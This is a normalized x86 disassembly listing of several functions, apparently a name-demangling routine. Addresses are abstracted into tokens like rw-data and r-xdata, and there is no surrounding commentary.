lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_410ed5
mov ecx [ rw-data ]
call sub_41590a
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_4110b8
call sub_41590a
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_410ed5
jmp r-xdata
mov eax [ rw-data ]
shr eax 0x8
not eax
test al 0x1
lea eax [ ebp - 0x38 ]
push eax
je r-xdata
push 0x3
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x28 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
test esi esi
je r-xdata
pop edi
pop esi
sub_413cd0
push edi
mov edi [ ecx ]
test edi edi
jne r-xdata
mov eax [ edi ]
push esi
mov esi [ eax + 0x4 ]
mov ecx esi
call j_sub_40d468
mov ecx edi
call esi
pop esi
pop edi
retn
xor al al
pop edi
retn
sub_413d0d
push ebx
mov ebx ecx
push esi
push edi
mov edi [ ebx + 0x8 ]
mov eax [ edi ]
mov esi [ eax + 0x4 ]
mov ecx esi
call j_sub_40d468
mov ecx edi
call esi
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x4 ]
mov eax [ edi ]
mov esi [ eax + 0x4 ]
mov ecx esi
call j_sub_40d468
mov ecx edi
call esi
sub_413d52
push ebp
mov ebp esp
sub esp 0x18
lea eax [ ebp - 0x10 ]
push 0x0
push eax
call sub_4132d1
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x60
lea ecx [ ebp - 0x18 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
push 0x27
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
call sub_410e4d
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_413d8f
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
add esi 0x7
and esi 0xfffffff8
cmp [ ebp + 0xc ] 0x0
push edi
mov edi ecx
je r-xdata
test esi esi
jne r-xdata
push esi
mov esi [ edi ]
mov ecx esi
call j_sub_40d468
call esi
pop ecx
jmp r-xdata
mov eax [ edi + 0x10 ]
push ebx
cmp eax esi
jae r-xdata
push 0x8
pop esi
pop edi
pop esi
pop ebp
retn 0x8
sub eax esi
mov [ edi + 0x10 ] eax
mov ebx 0x1000
cmp esi ebx
ja r-xdata
xor eax eax
jmp r-xdata
push 0x1
push 0x1004
mov ecx rw-data
call sub_413d8f
test eax eax
je r-xdata
pop ebx
xor eax eax
and [ eax ] 0x0
jmp r-xdata
mov ecx [ edi + 0xc ]
test ecx ecx
je r-xdata
test eax eax
je r-xdata
mov [ edi + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
add eax 0x4
add eax [ edi + 0xc ]
sub ebx esi
mov [ edi + 0xc ] eax
mov [ edi + 0x10 ] ebx
jmp r-xdata
sub_413e1d
mov ecx [ rw-data ]
mov al [ ecx ]
test al al
jne r-xdata
cmp al 0x30
jl r-xdata
xor eax eax
retn
xor edx edx
jmp r-xdata
cmp al 0x39
jg r-xdata
cmp al 0x40
jne r-xdata
movsx eax al
sub eax 0x2f
inc ecx
mov [ rw-data ] ecx
retn
test al al
je r-xdata
mov al [ ecx ]
inc ecx
mov [ rw-data ] ecx
cmp al 0x40
jne r-xdata
cmp al 0x41
jl r-xdata
or eax 0xffffffff
retn
mov eax edx
retn
cmp al 0x50
jg r-xdata
shl edx 0x4
movsx eax al
add edx 0xffffffbf
add edx eax
inc ecx
mov [ rw-data ] ecx
mov al [ ecx ]
sub_413e7e
push ebp
mov ebp esp
sub esp 0x28
mov ecx [ ebp - 0x4 ]
mov edx 0xffff0000
and [ ebp - 0xc ] edx
and ecx edx
push ebx
push esi
mov esi [ rw-data ]
push edi
xor edi edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edi
movsx eax [ esi ]
inc esi
mov [ ebp - 0x10 ] edi
mov [ rw-data ] esi
cmp eax 0x41
jg r-xdata
cmp eax 0x42
je r-xdata
je r-xdata
xor edi edi
inc edi
jle r-xdata
movsx eax [ esi - 0x1 ]
lea ecx [ ebp - 0x8 ]
push [ eax * 4 + r--data ]
call sub_410ba1
test edi edi
je r-xdata
test eax eax
je r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
je r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
je r-xdata
push 0x2
jmp r-xdata
cmp eax 0x5a
jle r-xdata
dec esi
mov [ rw-data ] esi
cmp eax 0x2f
jle r-xdata
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
push r--data
lea ecx [ ebp - 0x20 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov edi [ ebp - 0x28 ]
mov ecx [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
or ecx 0x200
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_41085d
cmp eax 0x5f
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0x31
jle r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
movsx eax [ esi ]
inc esi
mov [ rw-data ] esi
cmp eax 0x4f
jg r-xdata
and [ ebp - 0xc ] edx
mov ebx edi
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0xc ] bl
je r-xdata
cmp eax 0x39
jg r-xdata
cmp eax 0x54
jg r-xdata
cmp eax 0x44
jge r-xdata
push edi
lea eax [ ebp - 0x28 ]
push edi
push eax
call sub_41609f
add esp 0xc
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ rw-data ] esi
test ecx ecx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_415189
pop ecx
push eax
lea eax [ ebp - 0x28 ]
push eax
push 0x3c
lea ecx [ ebp - 0x18 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_410ed5
lea ecx [ ebp - 0x10 ]
call sub_413cd0
cmp al 0x3e
jne r-xdata
movsx eax [ esi - 0x1 ]
push [ eax * 4 + r--data ]
cmp eax 0x56
jle r-xdata
cmp eax 0x53
jge r-xdata
movsx eax [ esi - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp eax 0x39
jg r-xdata
test ebx ebx
je r-xdata
cmp [ esi - 0x1 ] 0x31
jne r-xdata
push 0x3e
lea ecx [ ebp - 0x10 ]
call sub_410f18
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push 0x20
lea ecx [ ebp - 0x10 ]
call sub_410f18
movsx eax [ esi - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp eax 0x57
jle r-xdata
sub eax 0x50
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_410823
jmp r-xdata
cmp eax 0x3f
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_410ed5
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x7e
lea ecx [ ebp - 0x28 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi [ rw-data ]
cmp [ esi ] bl
jne r-xdata
mov [ eax ] 0x1
lea ecx [ ebp - 0x8 ]
call sub_410ba1
cmp eax 0x59
jle r-xdata
movsx eax [ esi - 0x1 ]
lea ecx [ ebp - 0x8 ]
push [ eax * 4 + r--data ]
call sub_410ba1
push edi
lea eax [ ebp - 0x28 ]
push edi
push eax
call sub_413e7e
add esp 0xc
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
test ecx ecx
je r-xdata
sub eax 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
movsx eax [ esi ]
inc esi
mov [ rw-data ] esi
test eax eax
je r-xdata
cmp eax 0x40
jle r-xdata
movsx eax [ esi - 0x1 ]
lea ecx [ ebp - 0x20 ]
push [ eax * 4 + r--data ]
call sub_410823
mov edx [ ebp - 0x1c ]
or edx 0x8000
test eax eax
je r-xdata
mov ebx [ ebp - 0x10 ]
inc esi
mov [ rw-data ] esi
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
mov ecx [ ebp - 0xc ]
jmp r-xdata
cmp eax 0x5f
jne r-xdata
lea ecx [ ebp - 0x8 ]
test eax 0x400
je r-xdata
sub eax 0x1
jne r-xdata
cmp eax 0x30
jne r-xdata
cmp eax 0x42
jle r-xdata
cmp eax 0x2f
jle r-xdata
mov [ eax + 0x4 ] ecx
movsx eax [ esi ]
inc esi
mov [ rw-data ] esi
cmp eax 0x41
jl r-xdata
movsx eax [ esi - 0x1 ]
lea ecx [ ebp - 0x8 ]
push [ eax * 4 + r--data ]
call sub_410ba1
mov eax [ rw-data ]
mov al [ eax ]
test al al
jne r-xdata
push edi
push r--data
jmp r-xdata
cmp eax 0x43
jne r-xdata
cmp eax 0x36
jle r-xdata
cmp eax 0x44
jle r-xdata
movsx eax al
sub eax 0x30
js r-xdata
push 0x1
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x8 ]
call sub_410eb3
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_415067
mov edx [ ebp - 0x1c ]
add esp 0xc
or edx 0x1000
jmp r-xdata
push 0x1
push r--data
movsx eax [ esi - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp eax 0x38
jg r-xdata
movsx eax [ esi - 0x1 ]
push [ eax * 4 + r--data ]
jmp r-xdata
cmp eax 0x46
jle r-xdata
cmp eax 0x5
jae r-xdata
mov ecx [ ebp - 0x20 ]
jmp r-xdata
movsx eax [ esi - 0x1 ]
push [ eax * 4 + r--data ]
movsx eax [ esi - 0x1 ]
lea ecx [ ebp - 0x18 ]
push [ eax * 4 + r--data ]
call sub_410823
mov eax [ rw-data ]
cmp [ eax ] 0x3f
lea eax [ ebp - 0x28 ]
push eax
jne r-xdata
cmp eax 0x4a
jle r-xdata
push [ eax * 4 + r--data ]
lea ecx [ ebp - 0x10 ]
call sub_410ba1
mov ecx [ rw-data ]
movsx eax [ ecx ]
inc ecx
mov [ rw-data ] ecx
cmp eax 0x30
je r-xdata
call sub_415141
pop ecx
push eax
lea ecx [ ebp - 0x18 ]
call sub_410ed5
call sub_413085
pop ecx
push eax
lea ecx [ ebp - 0x18 ]
call sub_410ed5
mov eax [ rw-data ]
cmp [ eax ] 0x40
jne r-xdata
cmp eax 0x4b
jne r-xdata
lea eax [ ebp - 0x28 ]
push edi
push eax
call sub_412fb3
mov eax [ ebp - 0x28 ]
pop ecx
pop ecx
mov [ ebp - 0x18 ] eax
lea ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
push 0x20
mov [ ebp - 0x14 ] eax
call sub_410f18
mov eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_410ed5
lea ecx [ ebp - 0x20 ]
jmp r-xdata
cmp eax 0x31
je r-xdata
push r--data
lea ecx [ ebp - 0x18 ]
call sub_410fcd
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x14 ]
jmp r-xdata
inc eax
mov [ rw-data ] eax
jmp r-xdata
movsx eax [ esi - 0x1 ]
lea ecx [ ebp - 0x20 ]
push [ eax * 4 + r--data ]
call sub_410823
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_410e2b
jmp r-xdata
mov eax [ ebp - 0x8 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push eax
call sub_410ed5
push 0x2c
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_414ecf
pop ecx
mov ecx eax
call sub_410e4d
push eax
lea ecx [ ebp - 0x18 ]
call sub_410ed5
push 0x2c
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_414ecf
pop ecx
mov ecx eax
call sub_410e4d
push eax
lea ecx [ ebp - 0x18 ]
call sub_410ed5
push 0x2c
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_414ecf
pop ecx
mov ecx eax
call sub_410e4d
push eax
lea ecx [ ebp - 0x18 ]
call sub_410ed5
push 0x29
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x20 ]
push edi
push eax
call sub_4132d1
pop ecx
pop ecx
mov ecx eax
call sub_410e4d
push eax
lea ecx [ ebp - 0x18 ]
call sub_410ed5
push 0x27
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
call sub_410e4d
jmp r-xdata
add eax 0xffffffce
cmp eax 0x2
jbe r-xdata
mov ecx [ rw-data ]
mov al [ ecx ]
test al al
jne r-xdata
dec ecx
mov [ rw-data ] ecx
jmp r-xdata
cmp al 0x40
je r-xdata
cmp al 0x40
jne r-xdata
push 0x1
inc ecx
mov [ rw-data ] ecx
inc ecx
mov [ rw-data ] ecx
lea ecx [ ebp - 0x20 ]
push eax
call sub_410f18
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x20 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x1c ]
jmp r-xdata
sub_4144e0
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ rw-data ]
mov edx 0xffff0000
and [ ebp - 0x4 ] edx
push esi
push edi
movsx eax [ ecx ]
xor edi edi
mov [ ebp - 0x8 ] edi
sub eax edi
je r-xdata
push [ ebp + 0xc ]
sub eax 0x24
je r-xdata
mov al [ ecx + 0x1 ]
cmp al 0x24
je r-xdata
mov esi [ ebp + 0xc ]
sub eax 0x1d
je r-xdata
mov esi [ ebp + 0xc ]
add ecx 0x2
mov [ rw-data ] ecx
movsx eax [ ecx ]
cmp eax 0x51
jg r-xdata
test al al
je r-xdata
push r--data
sub eax 0x1
je r-xdata
sub eax 0x52
je r-xdata
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_41085d
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
push r--data
lea ecx [ ebp - 0x8 ]
call sub_410ba1
cmp [ esi ] edi
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_412497
push r--data
lea ecx [ ebp - 0x8 ]
call sub_410ba1
cmp [ esi ] edi
je r-xdata
sub eax 0x1
je r-xdata
push r--data
jmp r-xdata
sub eax edi
je r-xdata
mov ecx [ rw-data ]
push 0x20
lea ecx [ ebp - 0x8 ]
call sub_410f18
mov ecx [ rw-data ]
push 0x20
lea ecx [ ebp - 0x8 ]
call sub_410f18
inc ecx
mov [ rw-data ] ecx
jmp r-xdata
sub eax 0x1
je r-xdata
mov eax [ esi ]
inc ecx
mov [ ebp - 0x10 ] eax
mov eax [ esi + 0x4 ]
or eax 0x100
mov [ rw-data ] ecx
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_4147bd
add esp 0x10
jmp r-xdata
push esi
jmp r-xdata
sub eax 0x41
je r-xdata
inc ecx
mov [ rw-data ] ecx
mov ecx [ ebp + 0x8 ]
push r--data
call sub_410823
jmp r-xdata
sub eax 0x5
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_410e07
push esi
push [ ebp + 0x8 ]
inc ecx
mov [ rw-data ] ecx
call sub_4138b3
jmp r-xdata
sub eax 0x1
je r-xdata
push [ ebp + 0x8 ]
inc ecx
mov [ rw-data ] ecx
call sub_414dd4
jmp r-xdata
pop ecx
push 0x1
push esi
push [ ebp + 0x8 ]
inc ecx
mov [ rw-data ] ecx
call sub_4146bb
jmp r-xdata
sub eax 0x1
jne r-xdata
pop ecx
jmp r-xdata
add esp 0xc
and [ ebp - 0x4 ] edx
lea eax [ ebp - 0x8 ]
push edi
push eax
push r--data
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] edi
inc ecx
push esi
push eax
mov [ rw-data ] ecx
call sub_412955
push eax
push [ ebp + 0x8 ]
call sub_412497
add esp 0x1c
jmp r-xdata
sub_4146bb
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0x18
mov cl [ eax ]
test cl cl
je r-xdata
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_410e07
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ eax ] 0x59
jne r-xdata
cmp cl 0x58
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push esi
push eax
call sub_412497
test [ esi + 0x4 ] 0x4000
pop ecx
pop ecx
je r-xdata
push [ ebp + 0xc ]
inc eax
push [ ebp + 0x8 ]
mov [ rw-data ] eax
call sub_4121fc
pop ecx
pop ecx
jmp r-xdata
cmp cl 0x5f
jne r-xdata
inc eax
mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
test [ esi + 0x4 ] 0x2000
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1 ] cl
jne r-xdata
push eax
push r--data
push [ ebp + 0x8 ]
call sub_410de3
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push r--data
call sub_410823
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
jmp r-xdata
cmp [ eax + 0x2 ] 0x5a
jne r-xdata
add esp 0xc
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x18 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
jmp r-xdata
add eax 0x3
mov [ rw-data ] eax
sub_4147bd
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
push esi
push edi
mov al [ eax ]
test al al
je r-xdata
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_41085d
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
call sub_410fcd
mov edi [ ebp + 0xc ]
xor esi esi
cmp [ edi ] esi
je r-xdata
cmp al 0x36
jl r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
cmp [ ebx ] esi
je r-xdata
push edi
lea ecx [ ebp - 0x8 ]
call sub_410ed5
cmp al 0x5f
jne r-xdata
cmp al 0x39
jle r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
pop ebx
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
cmp [ edi ] esi
je r-xdata
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x8 ]
push 0x0
push [ ebp + 0xc ]
push esi
push [ ebp + 0x10 ]
push eax
call sub_412955
xor eax eax
cmp [ esi ] 0x2a
sete al
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_4146bb
add esp 0x20
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
call sub_410823
mov eax [ ebp + 0xc ]
xor esi esi
mov edi [ ebp + 0x10 ]
cmp [ eax ] esi
je r-xdata
push ebx
lea ecx [ ebp - 0x8 ]
call sub_410ed5
push 0x20
lea ecx [ ebp - 0x8 ]
call sub_410f18
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp [ edi ] esi
je r-xdata
cmp [ edi ] esi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_4138b3
pop ecx
pop ecx
push edi
lea ecx [ ebp - 0x8 ]
call sub_410ed5
push eax
lea ecx [ ebp - 0x8 ]
call sub_410ed5
test [ edi + 0x4 ] 0x100
jne r-xdata
sub_4148d5
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
push esi
push edi
mov cl [ eax ]
test cl cl
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x0
and [ eax + 0x4 ] 0xffff00ff
cmp cl 0x5f
jne r-xdata
inc eax
mov [ rw-data ] eax
movsx edi [ eax ]
sub edi 0x41
inc eax
mov [ rw-data ] eax
cmp edi 0x3
ja r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_41085d
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax [ rw-data ]
xor edx edx
mov ecx [ ebp - 0x4 ]
shr eax 0x1
and ecx 0xffff0000
not eax
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
test al 0x1
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
jmp r-xdata
push r--data
lea ecx [ ebp - 0x8 ]
call sub_410fcd
push 0xc
call sub_41112a
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_410fcd
test edi edi
je r-xdata
push 0x29
lea ecx [ ebp - 0x8 ]
call sub_410f18
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov esi edi
not esi
inc esi
and esi edi
mov eax esi
sub eax 0x1
je r-xdata
push r--data
sub eax 0x1
jne r-xdata
push r--data
lea ecx [ ebp - 0x8 ]
call sub_410fcd
jmp r-xdata
push r--data
jmp r-xdata
lea ecx [ ebp - 0x8 ]
call sub_410fcd
not esi
and edi esi
je r-xdata
sub_4149c7
push ebp
mov ebp esp
mov eax [ rw-data ]
push [ ebp + 0xc ]
cmp [ eax ] 0x40
jne r-xdata
push [ ebp + 0x8 ]
call sub_412fb3
pop ecx
pop ecx
mov ecx [ ebp + 0x8 ]
inc eax
mov [ rw-data ] eax
call sub_4107d6
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
sub_4149f6
push ebp
mov ebp esp
sub esp 0xf4
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x1 ] 0x0
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov eax [ esi + 0x4 ]
and eax 0xffff00ff
mov [ esi + 0x4 ] eax
test al al
jne r-xdata
mov eax [ rw-data ]
mov al [ eax ]
test al al
je r-xdata
mov ebx [ ebp - 0x8 ]
cmp [ esi ] 0x0
jne r-xdata
cmp al 0x40
je r-xdata
cmp al 0x40
je r-xdata
push esi
lea eax [ ebp - 0x74 ]
push eax
push r--data
lea eax [ ebp - 0x7c ]
push eax
push 0x1
lea ecx [ ebp - 0x6c ]
call sub_41085d
mov ecx eax
call sub_410e91
mov ecx eax
call sub_410e2b
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
push 0x1
mov ecx esi
call sub_410bd3
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
and [ esi + 0x4 ] 0xffff00ff
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x2
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x3f
jne r-xdata
push esi
lea eax [ ebp - 0x3c ]
push eax
push r--data
lea ecx [ ebp - 0xe4 ]
call sub_410823
mov ecx eax
call sub_410e2b
cmp [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x3c ]
mov [ esi ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0x4 ] eax
je r-xdata
lea eax [ ebp - 0x7c ]
push esi
push eax
lea eax [ ebp - 0x74 ]
inc eax
mov [ rw-data ] eax
movsx eax [ eax ]
sub eax 0x24
je r-xdata
push esi
lea eax [ ebp - 0x5c ]
push eax
push 0x5b
lea ecx [ ebp - 0xd4 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x5c ]
mov [ esi ] eax
mov eax [ ebp - 0x58 ]
mov [ esi + 0x4 ] eax
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov al [ eax ]
test al al
je r-xdata
dec [ rw-data ]
lea eax [ ebp - 0xc4 ]
push esi
push eax
lea eax [ ebp - 0x6c ]
jmp r-xdata
sub eax 0x1
je r-xdata
push 0x0
push 0x1
push eax
call sub_41609f
add esp 0xc
push 0x40
push rw-data
lea ecx [ ebp - 0x64 ]
call sub_4106db
push esi
lea eax [ ebp - 0x44 ]
push eax
push r--data
lea ecx [ ebp - 0xb4 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x44 ]
mov [ esi ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0x4 ] eax
mov ecx [ rw-data ]
cmp [ ecx ] 0x9
je r-xdata
sub eax 0x1a
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x64 ]
push eax
call sub_41106e
jmp r-xdata
mov eax [ rw-data ]
lea ecx [ eax + 0x1 ]
cmp [ ecx ] 0x5f
jne r-xdata
dec eax
sub eax 0x1
je r-xdata
lea eax [ ebp - 0x8c ]
push eax
call sub_413085
pop ecx
push eax
lea eax [ ebp - 0x4c ]
push eax
push 0x60
lea ecx [ ebp - 0x94 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x4c ]
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x48 ]
push 0x27
mov [ ebp - 0x30 ] eax
call sub_410f18
push esi
lea eax [ ebp - 0xa4 ]
push eax
lea ecx [ ebp - 0x34 ]
jmp r-xdata
cmp [ eax + 0x2 ] 0x3f
jne r-xdata
sub eax 0x8
je r-xdata
call sub_410e2b
push esi
lea eax [ ebp - 0xec ]
mov [ rw-data ] ecx
push eax
push 0x0
lea eax [ ebp - 0xbc ]
push 0x0
push eax
call sub_413e7e
add esp 0xc
mov ecx eax
call sub_410e2b
mov ecx eax
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x40
jne r-xdata
inc [ rw-data ]
lea eax [ ebp - 0x9c ]
push esi
push eax
push 0x5d
lea eax [ ebp - 0xcc ]
push eax
push 0x0
lea eax [ ebp - 0xac ]
push 0x1
push eax
call sub_41609f
add esp 0xc
mov ecx eax
call sub_410e4d
mov ecx eax
call sub_410e2b
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub eax 0x8
je r-xdata
jmp r-xdata
mov ecx eax
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
xor edi edi
and ebx 0xffff0000
inc [ rw-data ]
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] ebx
push esi
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0xf4 ]
push eax
call sub_413d52
pop ecx
jmp r-xdata
inc [ rw-data ]
jmp r-xdata
and ebx 0xffff0002
or ebx 0x2
xor edi edi
test edi edi
je r-xdata
mov ecx eax
and [ esi + 0x4 ] 0xffff00ff
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x2
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x40
jne r-xdata
mov edi [ ebp - 0x2c ]
mov ebx ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x20 ] ecx
lea ecx [ ebp - 0x24 ]
push r--data
mov [ ebp - 0x24 ] eax
call sub_410fcd
mov eax [ ebp - 0x24 ]
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
push eax
call sub_410ed5
mov edi [ ebp - 0x14 ]
mov ebx [ ebp - 0x10 ]
jmp r-xdata
push 0x0
lea eax [ ebp - 0x2c ]
push 0x1
push eax
call sub_41609f
mov ecx [ ebp - 0x28 ]
add esp 0xc
test cl cl
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push 0x5b
lea ecx [ ebp - 0xdc ]
call sub_4107aa
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x50 ]
push 0x5d
mov [ ebp - 0x18 ] eax
call sub_410f18
mov eax [ ebp - 0x1c ]
mov [ esi ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x4 ] eax
